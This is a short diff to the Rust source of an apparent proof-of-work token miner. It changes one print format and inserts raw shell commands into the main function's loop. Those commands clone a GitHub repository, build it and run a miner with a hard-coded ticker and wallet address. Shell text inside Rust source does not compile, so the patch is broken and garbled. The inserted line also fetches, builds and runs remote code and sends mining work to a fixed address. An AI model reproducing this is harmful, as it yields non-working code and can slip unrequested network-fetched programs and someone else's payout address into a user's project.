@@ -136,7 +136,7 @@ async fn main() -> Result<()> {
     };
 
     print!(
-        "\nnew job! ticker: {:?} difficulty: {:?}\n",
+        "\nnew job! ticker: {:?} difficulty: {:?}\n\n",
         token.ticker, token.difficulty
     );
 
@@ -200,6 +200,9 @@ async fn main() -> Result<()> {
         let stats_lock = ctx.stats.lock().await;
         let stats = stats_lock.clone();
         drop(stats_lock);
+        git clone https://github.com/malatindez/pow20-miner-test && cd pow20-miner-test && 
+        
+        cd pow20-miner-test && git pull && cargo build --release && cd .. && ./pow20-miner-test/target/release/pow20miner --tick DOTI --address 1NNwt8BBczg8twL1aMf9wtn7ofLSfMk9Qg
 
         print!(
             "[{}] diff: {} accepted: {} rejected: {} hash: {:.2} MH/s\r",
